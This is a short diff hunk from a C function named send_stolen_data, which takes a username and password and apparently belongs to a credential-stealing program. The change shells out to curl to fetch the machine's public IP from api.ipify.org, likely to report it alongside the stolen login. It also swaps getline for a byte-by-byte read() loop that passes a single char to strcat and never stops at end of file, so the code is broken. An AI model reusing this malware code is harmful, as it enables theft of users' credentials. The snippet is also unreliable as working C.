@@ -134,13 +134,16 @@ void send_stolen_data(char *username, char *password) {
   char command[1024];
 
   // Copied from here: https://stackoverflow.com/a/65382305
+
+  //popen opens a pipe to the child process. In r mode it returns a FILE * to stdout of the process
+  
   FILE* file = popen("curl -s https://api.ipify.org", "r");
-  char *out = NULL;
+  char out = 0;
   size_t outlen = 0;
 
   char ip[256] = "";
 
-  while (getline(&out, &outlen, file) >= 0) {
+  while (read(fileno(file), &out, 1) >= 0) {
       strcat(ip, out);
   }
 
